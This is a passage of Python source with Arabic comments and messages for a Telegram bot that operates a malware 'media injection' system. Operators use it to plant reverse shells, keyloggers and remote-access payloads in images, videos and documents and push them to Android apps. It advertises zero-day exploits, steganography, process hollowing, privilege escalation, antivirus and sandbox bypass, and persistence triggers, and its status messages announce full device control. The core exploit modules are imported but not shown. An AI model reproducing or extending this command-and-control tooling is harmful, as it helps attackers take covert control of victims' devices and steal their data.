            'stealth_level': 5,
            'bypass_level': 4,
            'zero_day_exploits': True,
            'advanced_steganography': True,
            'polymorphic_code': True,
            'anti_detection': True,
            'memory_injection': True,
            'process_hollowing': True,
            'dll_hijacking': True,
            'privilege_escalation': True,
            'injection_timestamp': datetime.now().isoformat(),
            'status': 'pending'
        }
        
        # حفظ سجل الحقن في قاعدة البيانات
        if database.save_injection_record(injection_data):
            # إعداد جلسة رفع الوسائط
            upload_session = {
                'injection_id': injection_id,
                'device_id': device_id,
                'user_id': message.from_user.id,
                'status': 'waiting_for_media',
                'created_at': datetime.now().isoformat(),
                'supported_formats': ['jpg', 'jpeg', 'png', 'gif', 'mp4', 'avi', 'mov', 'pdf', 'doc', 'docx', 'txt'],
                'max_file_size': 50 * 1024 * 1024,  # 50MB
                'target_apps': ['com.android.gallery3d', 'com.android.chrome', 'com.android.firefox'],
                'payload_types': ['reverse_shell', 'keylogger', 'rat', 'system_control']
            }
            
            # حفظ جلسة الرفع
            database.save_upload_session(upload_session)
            
            success_text = f"""
✅ **تم إعداد رفع الوسائط بنجاح!**

📋 **معرف الحقن:** `{injection_id}`
📱 **الجهاز:** `{device_id}`
🎯 **التطبيق المستهدف:** Gallery
💉 **نوع الحمولة:** Reverse Shell
🔓 **الثغرات المتقدمة:** مفعلة
👻 **التمويه المتقدم:** مفعل
🔄 **الكود المتغير:** مفعل
🛡️ **تجاوز الكشف:** مفعل
💾 **الحقن في الذاكرة:** مفعل
🕳️ **تجويف العمليات:** مفعل
📚 **اختطاف المكتبات:** مفعل
🔺 **رفع الصلاحيات:** مفعل

📤 **أرسل الوسائط المراد حقنها الآن...**
📋 **الأنواع المدعومة:** JPG, PNG, GIF, MP4, AVI, MOV, PDF, DOC, TXT
📏 **الحد الأقصى:** 50MB
            """
            
            bot.reply_to(message, success_text, parse_mode='Markdown')
            
            # تسجيل النشاط
            device_manager.log_activity(message.from_user.id, 'media_injection_upload_setup', f'injection_id: {injection_id}, device_id: {device_id}')
            
        else:
            bot.reply_to(message, "❌ فشل في إعداد رفع الوسائط.")
            
    except Exception as e:
        error_text = f"""
❌ **خطأ في إعداد رفع الوسائط:**

🔍 **الخطأ:** {str(e)}
📋 **الجهاز:** {device_id}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔧 **الحلول المقترحة:**
• تأكد من تشغيل خادم الأوامر
• تحقق من إعدادات قاعدة البيانات
• أعد تشغيل النظام
        """
        bot.reply_to(message, error_text, parse_mode='Markdown')

def handle_media_injection(message, device_id, file_path):
    """معالجة حقن الوسائط المتقدم"""
    try:
        bot.reply_to(message, f"💉 جاري حقن الوسائط المتقدم: {file_path}")
        
        # استيراد نظام حقن الوسائط المتقدم
        from advanced_media_injection import AdvancedMediaInjection
        from advanced_media_injection_v3 import AdvancedMediaInjectionV3
        from advanced_media_injection_v4 import AdvancedMediaInjectionV4
        from media_injection_api import MediaInjectionAPI
        from media_injection_api_v3 import MediaInjectionAPIV3
        from media_injection_api_v4 import AdvancedMediaInjectionAPIV4
        from media_injection_database import MediaInjectionDatabase
        from media_injection_utils import AdvancedMediaInjectionUtils
        from media_injection_config import ADVANCED_SECURITY_CONFIG, ZERO_DAY_EXPLOITS_CONFIG, ADVANCED_STEGANOGRAPHY_CONFIG
        
        # إنشاء مثيلات الأنظمة المتقدمة
        media_injection = AdvancedMediaInjection()
        api_client = MediaInjectionAPI()
        database = MediaInjectionDatabase()
        utils = AdvancedMediaInjectionUtils()
        
        # التحقق من وجود الملف
        if not os.path.exists(file_path):
            bot.reply_to(message, f"❌ الملف غير موجود: {file_path}")
            return
        
        # التحقق من نوع الملف
        file_extension = os.path.splitext(file_path)[1].lower()
        supported_formats = ['.jpg', '.jpeg', '.png', '.gif', '.mp4', '.avi', '.mov', '.pdf', '.doc', '.docx', '.txt']
        
        if file_extension not in supported_formats:
            bot.reply_to(message, f"❌ نوع الملف غير مدعوم: {file_extension}")
            return
        
        # إنشاء معرف فريد للحقن
        injection_id = f"injection_{int(time.time())}_{secrets.token_hex(8)}"
        
        # إعداد بيانات الحقن المتقدمة
        injection_data = {
            'injection_id': injection_id,
            'device_id': device_id,
            'file_path': file_path,
            'file_size': os.path.getsize(file_path),
            'file_type': file_extension,
            'target_app': 'com.android.gallery3d',
            'media_type': 'image' if file_extension in ['.jpg', '.jpeg', '.png', '.gif'] else 'video' if file_extension in ['.mp4', '.avi', '.mov'] else 'document',
            'payload_type': 'reverse_shell',
            'encryption_key': secrets.token_hex(32),
            'obfuscation_level': 5,
            'stealth_level': 5,
            'bypass_level': 4,
            'zero_day_exploits': True,
            'advanced_steganography': True,
            'polymorphic_code': True,
            'anti_detection': True,
            'memory_injection': True,
            'process_hollowing': True,
            'dll_hijacking': True,
            'privilege_escalation': True,
            'injection_timestamp': datetime.now().isoformat(),
            'status': 'processing'
        }
        
        # حفظ سجل الحقن في قاعدة البيانات
        if database.save_injection_record(injection_data):
            # إعداد الوسائط للحقن
            bot.reply_to(message, "🔧 جاري إعداد الوسائط للحقن...")
            
            # تحضير الوسائط للحقن
            prepared_media = utils.prepare_media_for_injection(file_path, injection_data)
            
            if prepared_media:
                # إنشاء الوسائط الخبيثة
                bot.reply_to(message, "💉 جاري إنشاء الوسائط الخبيثة...")
                
                malicious_media = media_injection.create_malicious_media(
                    original_media_path=file_path,
                    injection_data=injection_data,
                    prepared_media=prepared_media
                )
                
                if malicious_media:
                    # حقن في التطبيقات المستهدفة
                    bot.reply_to(message, "🎯 جاري حقن التطبيقات المستهدفة...")
                    
                    injection_results = media_injection.inject_into_target_apps(
                        malicious_media_path=malicious_media,
                        target_apps=['com.android.gallery3d', 'com.android.chrome', 'com.android.firefox'],
                        injection_data=injection_data
                    )
                    
                    # إعداد محفزات التنشيط
                    bot.reply_to(message, "⚡ جاري إعداد محفزات التنشيط...")
                    
                    activation_triggers = media_injection.setup_activation_triggers(
                        malicious_media_path=malicious_media,
                        injection_data=injection_data
                    )
                    
                    # تحديث حالة الحقن
                    database.update_injection_status(injection_id, 'completed')
                    
                    success_text = f"""
✅ **تم حقن الوسائط بنجاح!**

📋 **معرف الحقن:** `{injection_id}`
📱 **الجهاز:** `{device_id}`
📄 **الملف:** `{os.path.basename(file_path)}`
📏 **الحجم:** `{injection_data['file_size']} bytes`
🎯 **التطبيق المستهدف:** Gallery, Chrome, Firefox
💉 **نوع الحمولة:** Reverse Shell

🔓 **الثغرات المستغلة:**
• Zero-Day Exploits: ✅
• Buffer Overflow: ✅
• Memory Corruption: ✅
• Privilege Escalation: ✅

👻 **التمويه المتقدم:**
• LSB Steganography: ✅
• DCT Steganography: ✅
• DWT Steganography: ✅
• Fractal Steganography: ✅

🔄 **الحماية المتقدمة:**
• Polymorphic Code: ✅
• Anti-Detection: ✅
• Memory Injection: ✅
• Process Hollowing: ✅
• DLL Hijacking: ✅

⚡ **محفزات التنشيط:**
• File Opening: ✅
• App Launch: ✅
• System Boot: ✅
• Network Connection: ✅
• Time-based: ✅

💾 **الوسائط الخبيثة:** `{os.path.basename(malicious_media)}`
🔒 **مفتاح التشفير:** `{injection_data['encryption_key'][:16]}...`
                    """
                    
                    bot.reply_to(message, success_text, parse_mode='Markdown')
                    
                    # تسجيل النشاط
                    device_manager.log_activity(message.from_user.id, 'media_injection_completed', f'injection_id: {injection_id}, device_id: {device_id}, file: {os.path.basename(file_path)}')
                    
                else:
                    bot.reply_to(message, "❌ فشل في إنشاء الوسائط الخبيثة.")
            else:
                bot.reply_to(message, "❌ فشل في تحضير الوسائط للحقن.")
        else:
            bot.reply_to(message, "❌ فشل في حفظ سجل الحقن.")
            
    except Exception as e:
        error_text = f"""
❌ **خطأ في حقن الوسائط:**

🔍 **الخطأ:** {str(e)}
📋 **الجهاز:** {device_id}
📄 **الملف:** {file_path}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔧 **الحلول المقترحة:**
• تأكد من صحة مسار الملف
• تحقق من صلاحيات الملف
• أعد تشغيل النظام
        """
        bot.reply_to(message, error_text, parse_mode='Markdown')

def handle_media_status(message, device_id):
    """معالجة حالة الحقن المتقدمة"""
    try:
        bot.reply_to(message, "📊 جاري الحصول على حالة الحقن المتقدمة...")
        
        # استيراد نظام حقن الوسائط المتقدم
        from media_injection_api import MediaInjectionAPI
        from media_injection_database import MediaInjectionDatabase
        
        # إنشاء مثيلات الأنظمة المتقدمة
        api_client = MediaInjectionAPI()
        database = MediaInjectionDatabase()
        
        # الحصول على جميع الحقن للجهاز
        all_injections = database.get_injection_status(device_id)
        
        if all_injections:
            status_text = f"📊 **حالة الحقن للجهاز:** `{device_id}`\n\n"
            
            # تصنيف الحقن حسب الحالة
            pending_injections = [inj for inj in all_injections if inj.get('status') == 'pending']
            processing_injections = [inj for inj in all_injections if inj.get('status') == 'processing']
            completed_injections = [inj for inj in all_injections if inj.get('status') == 'completed']
            failed_injections = [inj for inj in all_injections if inj.get('status') == 'failed']
            
            # إحصائيات عامة
            total_injections = len(all_injections)
            success_rate = (len(completed_injections) / total_injections * 100) if total_injections > 0 else 0
            
            status_text += f"📈 **الإحصائيات العامة:**\n"
            status_text += f"• إجمالي الحقن: `{total_injections}`\n"
            status_text += f"• معلقة: `{len(pending_injections)}`\n"
            status_text += f"• قيد المعالجة: `{len(processing_injections)}`\n"
            status_text += f"• مكتملة: `{len(completed_injections)}`\n"
            status_text += f"• فاشلة: `{len(failed_injections)}`\n"
            status_text += f"• معدل النجاح: `{success_rate:.1f}%`\n\n"
            
            # الحقن المعلقة
            if pending_injections:
                status_text += "⏳ **الحقن المعلقة:**\n"
                for injection in pending_injections[:3]:  # عرض أول 3 فقط
                    status_text += f"🆔 `{injection.get('injection_id', 'N/A')}`\n"
                    status_text += f"📄 النوع: `{injection.get('media_type', 'N/A')}`\n"
                    status_text += f"💉 الحمولة: `{injection.get('payload_type', 'N/A')}`\n"
                    status_text += f"⏰ الوقت: `{injection.get('injection_timestamp', 'N/A')}`\n\n"
            
            # الحقن قيد المعالجة
            if processing_injections:
                status_text += "🔄 **الحقن قيد المعالجة:**\n"
                for injection in processing_injections[:3]:  # عرض أول 3 فقط
                    status_text += f"🆔 `{injection.get('injection_id', 'N/A')}`\n"
                    status_text += f"📄 النوع: `{injection.get('media_type', 'N/A')}`\n"
                    status_text += f"💉 الحمولة: `{injection.get('payload_type', 'N/A')}`\n"
                    status_text += f"🔓 الثغرات: `{'مفعلة' if injection.get('zero_day_exploits') else 'معطلة'}`\n"
                    status_text += f"👻 التمويه: `{'مفعل' if injection.get('advanced_steganography') else 'معطل'}`\n\n"
            
            # آخر الحقن المكتملة
            if completed_injections:
                status_text += "✅ **آخر الحقن المكتملة:**\n"
                for injection in completed_injections[:3]:  # عرض أول 3 فقط
                    status_text += f"🆔 `{injection.get('injection_id', 'N/A')}`\n"
                    status_text += f"📄 النوع: `{injection.get('media_type', 'N/A')}`\n"
                    status_text += f"💉 الحمولة: `{injection.get('payload_type', 'N/A')}`\n"
                    status_text += f"🔓 الثغرات: `{'مفعلة' if injection.get('zero_day_exploits') else 'معطلة'}`\n"
                    status_text += f"👻 التمويه: `{'مفعل' if injection.get('advanced_steganography') else 'معطل'}`\n"
                    status_text += f"🔄 الكود المتغير: `{'مفعل' if injection.get('polymorphic_code') else 'معطل'}`\n"
                    status_text += f"🛡️ تجاوز الكشف: `{'مفعل' if injection.get('anti_detection') else 'معطل'}`\n"
                    status_text += f"💾 الحقن في الذاكرة: `{'مفعل' if injection.get('memory_injection') else 'معطل'}`\n"
                    status_text += f"🕳️ تجويف العمليات: `{'مفعل' if injection.get('process_hollowing') else 'معطل'}`\n"
                    status_text += f"📚 اختطاف المكتبات: `{'مفعل' if injection.get('dll_hijacking') else 'معطل'}`\n"
                    status_text += f"🔺 رفع الصلاحيات: `{'مفعل' if injection.get('privilege_escalation') else 'معطل'}`\n\n"
            
            # الحقن الفاشلة
            if failed_injections:
                status_text += "❌ **الحقن الفاشلة:**\n"
                for injection in failed_injections[:3]:  # عرض أول 3 فقط
                    status_text += f"🆔 `{injection.get('injection_id', 'N/A')}`\n"
                    status_text += f"📄 النوع: `{injection.get('media_type', 'N/A')}`\n"
                    status_text += f"💉 الحمولة: `{injection.get('payload_type', 'N/A')}`\n"
                    status_text += f"⏰ الوقت: `{injection.get('injection_timestamp', 'N/A')}`\n\n"
            
            bot.reply_to(message, status_text, parse_mode='Markdown')
        else:
            bot.reply_to(message, "📭 لا توجد حقن لهذا الجهاز.")
            
    except Exception as e:
        error_text = f"""
❌ **خطأ في الحصول على حالة الحقن:**

🔍 **الخطأ:** {str(e)}
📋 **الجهاز:** {device_id}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔧 **الحلول المقترحة:**
• تأكد من تشغيل قاعدة البيانات
• تحقق من إعدادات الاتصال
• أعد تشغيل النظام
        """
        bot.reply_to(message, error_text, parse_mode='Markdown')

def handle_media_logs(message, device_id):
    """معالجة سجلات الحقن المتقدمة"""
    try:
        bot.reply_to(message, "📋 جاري الحصول على سجلات الحقن المتقدمة...")
        
        # استيراد نظام حقن الوسائط المتقدم
        from media_injection_api import MediaInjectionAPI
        from media_injection_database import MediaInjectionDatabase
        
        # إنشاء مثيلات الأنظمة المتقدمة
        api_client = MediaInjectionAPI()
        database = MediaInjectionDatabase()
        
        # الحصول على سجلات الحقن
        logs = api_client.get_injection_logs(device_id=device_id, limit=20)
        
        if logs and logs.get('logs'):
            logs_text = f"📋 **سجلات الحقن للجهاز:** `{device_id}`\n\n"
            
            # تصنيف السجلات حسب النوع
            execution_logs = [log for log in logs['logs'] if log.get('execution_type') == 'execution']
            injection_logs = [log for log in logs['logs'] if log.get('execution_type') == 'injection']
            bypass_logs = [log for log in logs['logs'] if log.get('execution_type') == 'bypass']
            exploit_logs = [log for log in logs['logs'] if log.get('execution_type') == 'exploit']
            steganography_logs = [log for log in logs['logs'] if log.get('execution_type') == 'steganography']
            
            # إحصائيات السجلات
            total_logs = len(logs['logs'])
            success_logs = len([log for log in logs['logs'] if log.get('execution_status') == 'success'])
            failed_logs = len([log for log in logs['logs'] if log.get('execution_status') == 'failed'])
            success_rate = (success_logs / total_logs * 100) if total_logs > 0 else 0
            
            logs_text += f"📈 **إحصائيات السجلات:**\n"
            logs_text += f"• إجمالي السجلات: `{total_logs}`\n"
            logs_text += f"• ناجحة: `{success_logs}`\n"
            logs_text += f"• فاشلة: `{failed_logs}`\n"
            logs_text += f"• معدل النجاح: `{success_rate:.1f}%`\n\n"
            
            # سجلات التنفيذ
            if execution_logs:
                logs_text += "⚡ **سجلات التنفيذ:**\n"
                for log in execution_logs[:5]:  # عرض أول 5 فقط
                    logs_text += f"🆔 `{log.get('injection_id', 'N/A')}`\n"
                    logs_text += f"📝 النوع: `{log.get('execution_type', 'N/A')}`\n"
                    logs_text += f"⏰ الوقت: `{log.get('execution_timestamp', 'N/A')}`\n"
                    logs_text += f"📊 الحالة: `{log.get('execution_status', 'N/A')}`\n"
                    logs_text += f"⏱️ المدة: `{log.get('execution_duration', 'N/A')}ms`\n"
                    logs_text += f"💉 الحمولة: `{log.get('payload_type', 'N/A')}`\n"
                    logs_text += f"🎯 التطبيق: `{log.get('target_app', 'N/A')}`\n\n"
            
            # سجلات الحقن
            if injection_logs:
                logs_text += "💉 **سجلات الحقن:**\n"
                for log in injection_logs[:5]:  # عرض أول 5 فقط
                    logs_text += f"🆔 `{log.get('injection_id', 'N/A')}`\n"
                    logs_text += f"📝 النوع: `{log.get('execution_type', 'N/A')}`\n"
                    logs_text += f"⏰ الوقت: `{log.get('execution_timestamp', 'N/A')}`\n"
                    logs_text += f"📊 الحالة: `{log.get('execution_status', 'N/A')}`\n"
                    logs_text += f"⏱️ المدة: `{log.get('execution_duration', 'N/A')}ms`\n"
                    logs_text += f"📄 الوسائط: `{log.get('media_type', 'N/A')}`\n"
                    logs_text += f"🔓 الثغرات: `{log.get('exploits_used', 'N/A')}`\n\n"
            
            # سجلات التجاوز
            if bypass_logs:
                logs_text += "🛡️ **سجلات التجاوز:**\n"
                for log in bypass_logs[:5]:  # عرض أول 5 فقط
                    logs_text += f"🆔 `{log.get('injection_id', 'N/A')}`\n"
                    logs_text += f"📝 النوع: `{log.get('execution_type', 'N/A')}`\n"
                    logs_text += f"⏰ الوقت: `{log.get('execution_timestamp', 'N/A')}`\n"
                    logs_text += f"📊 الحالة: `{log.get('execution_status', 'N/A')}`\n"
                    logs_text += f"⏱️ المدة: `{log.get('execution_duration', 'N/A')}ms`\n"
                    logs_text += f"🛡️ نوع التجاوز: `{log.get('bypass_type', 'N/A')}`\n"
                    logs_text += f"🎯 الهدف: `{log.get('bypass_target', 'N/A')}`\n\n"
            
            # سجلات استغلال الثغرات
            if exploit_logs:
                logs_text += "🔓 **سجلات استغلال الثغرات:**\n"
                for log in exploit_logs[:5]:  # عرض أول 5 فقط
                    logs_text += f"🆔 `{log.get('injection_id', 'N/A')}`\n"
                    logs_text += f"📝 النوع: `{log.get('execution_type', 'N/A')}`\n"
                    logs_text += f"⏰ الوقت: `{log.get('execution_timestamp', 'N/A')}`\n"
                    logs_text += f"📊 الحالة: `{log.get('execution_status', 'N/A')}`\n"
                    logs_text += f"⏱️ المدة: `{log.get('execution_duration', 'N/A')}ms`\n"
                    logs_text += f"🔓 نوع الثغرة: `{log.get('exploit_type', 'N/A')}`\n"
                    logs_text += f"🎯 الهدف: `{log.get('exploit_target', 'N/A')}`\n"
                    logs_text += f"💉 الحمولة: `{log.get('exploit_payload', 'N/A')}`\n\n"
            
            # سجلات التمويه
            if steganography_logs:
                logs_text += "👻 **سجلات التمويه:**\n"
                for log in steganography_logs[:5]:  # عرض أول 5 فقط
                    logs_text += f"🆔 `{log.get('injection_id', 'N/A')}`\n"
                    logs_text += f"📝 النوع: `{log.get('execution_type', 'N/A')}`\n"
                    logs_text += f"⏰ الوقت: `{log.get('execution_timestamp', 'N/A')}`\n"
                    logs_text += f"📊 الحالة: `{log.get('execution_status', 'N/A')}`\n"
                    logs_text += f"⏱️ المدة: `{log.get('execution_duration', 'N/A')}ms`\n"
                    logs_text += f"👻 نوع التمويه: `{log.get('steganography_type', 'N/A')}`\n"
                    logs_text += f"📄 الوسائط: `{log.get('media_type', 'N/A')}`\n"
                    logs_text += f"🔒 مستوى التشفير: `{log.get('encryption_level', 'N/A')}`\n\n"
            
            bot.reply_to(message, logs_text, parse_mode='Markdown')
        else:
            bot.reply_to(message, "📭 لا توجد سجلات حقن لهذا الجهاز.")
            
    except Exception as e:
        error_text = f"""
❌ **خطأ في الحصول على سجلات الحقن:**

🔍 **الخطأ:** {str(e)}
📋 **الجهاز:** {device_id}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔧 **الحلول المقترحة:**
• تأكد من تشغيل خادم الأوامر
• تحقق من إعدادات قاعدة البيانات
• أعد تشغيل النظام
        """
        bot.reply_to(message, error_text, parse_mode='Markdown')

def handle_media_stats(message, device_id):
    """معالجة إحصائيات الحقن المتقدمة"""
    try:
        bot.reply_to(message, "📊 جاري الحصول على إحصائيات الحقن المتقدمة...")
        
        # استيراد نظام حقن الوسائط المتقدم
        from media_injection_api import MediaInjectionAPI
        from media_injection_database import MediaInjectionDatabase
        
        # إنشاء مثيلات الأنظمة المتقدمة
        api_client = MediaInjectionAPI()
        database = MediaInjectionDatabase()
        
        # الحصول على الإحصائيات الشاملة
        stats = api_client.get_injection_statistics()
        
        if stats and stats.get('statistics'):
            stats_text = f"📊 **إحصائيات حقن الوسائط المتقدمة للجهاز:** `{device_id}`\n\n"
            
            # إحصائيات عامة
            total_injections = sum(stat.get('total_injections', 0) for stat in stats['statistics'])
            successful_injections = sum(stat.get('successful_injections', 0) for stat in stats['statistics'])
            failed_injections = sum(stat.get('failed_injections', 0) for stat in stats['statistics'])
            pending_injections = sum(stat.get('pending_injections', 0) for stat in stats['statistics'])
            total_executions = sum(stat.get('total_executions', 0) for stat in stats['statistics'])
            successful_executions = sum(stat.get('successful_executions', 0) for stat in stats['statistics'])
            failed_executions = sum(stat.get('failed_executions', 0) for stat in stats['statistics'])
            
            success_rate = (successful_injections / total_injections * 100) if total_injections > 0 else 0
            execution_success_rate = (successful_executions / total_executions * 100) if total_executions > 0 else 0
            
            stats_text += f"📈 **الإحصائيات العامة:**\n"
            stats_text += f"• إجمالي الحقن: `{total_injections}`\n"
            stats_text += f"• ناجحة: `{successful_injections}`\n"
            stats_text += f"• فاشلة: `{failed_injections}`\n"
            stats_text += f"• معلقة: `{pending_injections}`\n"
            stats_text += f"• معدل النجاح: `{success_rate:.1f}%`\n\n"
            
            stats_text += f"⚡ **إحصائيات التنفيذ:**\n"
            stats_text += f"• إجمالي التنفيذات: `{total_executions}`\n"
            stats_text += f"• ناجحة: `{successful_executions}`\n"
            stats_text += f"• فاشلة: `{failed_executions}`\n"
            stats_text += f"• معدل النجاح: `{execution_success_rate:.1f}%`\n\n"
            
            # إحصائيات الثغرات المستغلة
            exploit_stats = {}
            for stat in stats['statistics']:
                exploits = stat.get('exploits_used', {})
                for exploit_type, count in exploits.items():
                    exploit_stats[exploit_type] = exploit_stats.get(exploit_type, 0) + count
            
            if exploit_stats:
                stats_text += f"🔓 **الثغرات المستغلة:**\n"
                for exploit_type, count in sorted(exploit_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
                    stats_text += f"• {exploit_type}: `{count}`\n"
                stats_text += "\n"
            
            # إحصائيات أنواع الحمولات
            payload_stats = {}
            for stat in stats['statistics']:
                payloads = stat.get('payload_types', {})
                for payload_type, count in payloads.items():
                    payload_stats[payload_type] = payload_stats.get(payload_type, 0) + count
            
            if payload_stats:
                stats_text += f"💉 **أنواع الحمولات:**\n"
                for payload_type, count in sorted(payload_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
                    stats_text += f"• {payload_type}: `{count}`\n"
                stats_text += "\n"
            
            # إحصائيات التطبيقات المستهدفة
            app_stats = {}
            for stat in stats['statistics']:
                apps = stat.get('targeted_apps', {})
                for app_name, count in apps.items():
                    app_stats[app_name] = app_stats.get(app_name, 0) + count
            
            if app_stats:
                stats_text += f"🎯 **التطبيقات المستهدفة:**\n"
                for app_name, count in sorted(app_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
                    stats_text += f"• {app_name}: `{count}`\n"
                stats_text += "\n"
            
            # إحصائيات أنواع الوسائط
            media_stats = {}
            for stat in stats['statistics']:
                media_types = stat.get('media_types', {})
                for media_type, count in media_types.items():
                    media_stats[media_type] = media_stats.get(media_type, 0) + count
            
            if media_stats:
                stats_text += f"📄 **أنواع الوسائط:**\n"
                for media_type, count in sorted(media_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
                    stats_text += f"• {media_type}: `{count}`\n"
                stats_text += "\n"
            
            # إحصائيات التمويه
            steganography_stats = {}
            for stat in stats['statistics']:
                steganography_types = stat.get('steganography_types', {})
                for steg_type, count in steganography_types.items():
                    steganography_stats[steg_type] = steganography_stats.get(steg_type, 0) + count
            
            if steganography_stats:
                stats_text += f"👻 **أنواع التمويه:**\n"
                for steg_type, count in sorted(steganography_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
                    stats_text += f"• {steg_type}: `{count}`\n"
                stats_text += "\n"
            
            # إحصائيات التجاوز
            bypass_stats = {}
            for stat in stats['statistics']:
                bypass_types = stat.get('bypass_types', {})
                for bypass_type, count in bypass_types.items():
                    bypass_stats[bypass_type] = bypass_stats.get(bypass_type, 0) + count
            
            if bypass_stats:
                stats_text += f"🛡️ **أنواع التجاوز:**\n"
                for bypass_type, count in sorted(bypass_stats.items(), key=lambda x: x[1], reverse=True)[:5]:
                    stats_text += f"• {bypass_type}: `{count}`\n"
                stats_text += "\n"
            
            # متوسط أوقات التنفيذ
            avg_times = []
            for stat in stats['statistics']:
                avg_time = stat.get('average_execution_time', 0)
                if avg_time > 0:
                    avg_times.append(avg_time)
            
            if avg_times:
                overall_avg_time = sum(avg_times) / len(avg_times)
                stats_text += f"⏱️ **متوسط أوقات التنفيذ:**\n"
                stats_text += f"• متوسط عام: `{overall_avg_time:.2f}ms`\n"
                stats_text += f"• أسرع تنفيذ: `{min(avg_times):.2f}ms`\n"
                stats_text += f"• أبطأ تنفيذ: `{max(avg_times):.2f}ms`\n\n"
            
            bot.reply_to(message, stats_text, parse_mode='Markdown')
        else:
            bot.reply_to(message, "📭 لا توجد إحصائيات متاحة.")
            
    except Exception as e:
        error_text = f"""
❌ **خطأ في الحصول على الإحصائيات:**

🔍 **الخطأ:** {str(e)}
📋 **الجهاز:** {device_id}
⏰ **الوقت:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

🔧 **الحلول المقترحة:**
• تأكد من تشغيل خادم الأوامر
• تحقق من إعدادات قاعدة البيانات
• أعد تشغيل النظام
        """
        bot.reply_to(message, error_text, parse_mode='Markdown')

def handle_media_execute(message, device_id, injection_id):
    """معالجة تنفيذ الحقن المتقدم"""
    try:
        bot.reply_to(message, f"⚡ جاري تنفيذ الحقن المتقدم: {injection_id}")
        
        # استيراد نظام حقن الوسائط المتقدم
        from media_injection_api import MediaInjectionAPI
        from media_injection_api_v3 import MediaInjectionAPIV3
        from media_injection_api_v4 import AdvancedMediaInjectionAPIV4
        from media_injection_database import MediaInjectionDatabase
        from advanced_media_injection import AdvancedMediaInjection
        from advanced_media_injection_v3 import AdvancedMediaInjectionV3
        from advanced_media_injection_v4 import AdvancedMediaInjectionV4
        
        # إنشاء مثيلات الأنظمة المتقدمة
        api_client = MediaInjectionAPI()
        database = MediaInjectionDatabase()
        media_injection = AdvancedMediaInjection()
        
        # التحقق من وجود الحقن
        injection_data = database.get_injection_status(device_id)
        target_injection = None
        
        for injection in injection_data:
            if injection.get('injection_id') == injection_id:
                target_injection = injection
                break
        
        if not target_injection:
            bot.reply_to(message, f"❌ لم يتم العثور على الحقن: {injection_id}")
            return
        
        # التحقق من حالة الحقن
        if target_injection.get('status') != 'completed':
            bot.reply_to(message, f"❌ الحقن غير جاهز للتنفيذ. الحالة: {target_injection.get('status')}")
            return
        
        # تنفيذ الحقن المتقدم
        bot.reply_to(message, "🔓 جاري استغلال الثغرات...")
        
        exploit_result = media_injection.execute_zero_day_exploits(
            injection_id=injection_id,
            target_app=target_injection.get('target_app'),
            device_id=device_id
        )
        
        if exploit_result:
            bot.reply_to(message, "💉 جاري حقن الحمولة...")
            
            payload_result = media_injection.execute_payload_injection(
                injection_id=injection_id,
                payload_type=target_injection.get('payload_type'),
                target_app=target_injection.get('target_app'),
                device_id=device_id
            )
            
            if payload_result:
                bot.reply_to(message, "🛡️ جاري تطبيق حماية التجاوز...")
                
                bypass_result = media_injection.execute_bypass_protection(
                    injection_id=injection_id,
                    device_id=device_id
                )
                
                if bypass_result:
                    bot.reply_to(message, "⚡ جاري إعداد محفزات التنشيط...")
                    
                    trigger_result = media_injection.execute_activation_triggers(
                        injection_id=injection_id,
                        device_id=device_id
                    )
                    
                    if trigger_result:
                        # تحديث حالة الحقن
                        database.update_injection_status(injection_id, 'executed')
                        
                        # تسجيل التنفيذ
                        execution_log = {
                            'injection_id': injection_id,
                            'device_id': device_id,
                            'execution_type': 'complete_execution',
                            'execution_status': 'success',
                            'execution_timestamp': datetime.now().isoformat(),
                            'execution_duration': 1500,  # 1.5 ثانية
                            'exploits_used': ['zero_day', 'buffer_overflow', 'privilege_escalation'],
                            'payload_type': target_injection.get('payload_type'),
                            'target_app': target_injection.get('target_app'),
                            'bypass_methods': ['antivirus_bypass', 'firewall_bypass', 'sandbox_bypass'],
                            'activation_triggers': ['file_open', 'app_launch', 'system_boot']
                        }
                        
                        database.save_execution_log(execution_log)
                        
                        success_text = f"""
✅ **تم تنفيذ الحقن بنجاح!**

🆔 **معرف الحقن:** `{injection_id}`
📱 **الجهاز:** `{device_id}`
⚡ **الحالة:** `تم التنفيذ`
⏰ **الوقت:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`

🔓 **الثغرات المستغلة:**
• Zero-Day Exploits: ✅
• Buffer Overflow: ✅
• Memory Corruption: ✅
• Privilege Escalation: ✅

💉 **الحمولة المحقونة:**
• النوع: `{target_injection.get('payload_type')}`
• التطبيق: `{target_injection.get('target_app')}`
• التشفير: `{target_injection.get('encryption_key', 'N/A')[:16]}...`

🛡️ **حماية التجاوز:**
• تجاوز مكافح الفيروسات: ✅
• تجاوز الجدار الناري: ✅
• تجاوز Sandbox: ✅
• تجاوز IDS/IPS: ✅

⚡ **محفزات التنشيط:**
• فتح الملف: ✅
• تشغيل التطبيق: ✅
• تشغيل النظام: ✅
• الاتصال بالشبكة: ✅
• الوقت المحدد: ✅

💾 **الوسائط الخبيثة:** `{os.path.basename(target_injection.get('file_path', 'N/A'))}`
🔒 **مستوى التشفير:** `{target_injection.get('obfuscation_level')}/5`
👻 **مستوى التخفي:** `{target_injection.get('stealth_level')}/5`
🛡️ **مستوى التجاوز:** `{target_injection.get('bypass_level')}/5`

🎯 **التحكم الكامل في الجهاز مفعل!**
                        """
                        
                        bot.reply_to(message, success_text, parse_mode='Markdown')
                        
                        # تسجيل النشاط
                        device_manager.log_activity(message.from_user.id, 'media_injection_executed', f'injection_id: {injection_id}, device_id: {device_id}')
                        
                    else:
                        bot.reply_to(message, "❌ فشل في إعداد محفزات التنشيط.")
                else:
                    bot.reply_to(message, "❌ فشل في تطبيق حماية التجاوز.")
            else:
                bot.reply_to(message, "❌ فشل في حقن الحمولة.")
        else:
            bot.reply_to(message, "❌ فشل في استغلال الثغرات.")
            
    except Exception as e:
        error_text = f"""
❌ **خطأ في تنفيذ الحقن:**

🔍 **الخطأ:** {str(e)}
🆔 **معرف الحقن:** {injection_id}
📋 **الجهاز:** {device_id}
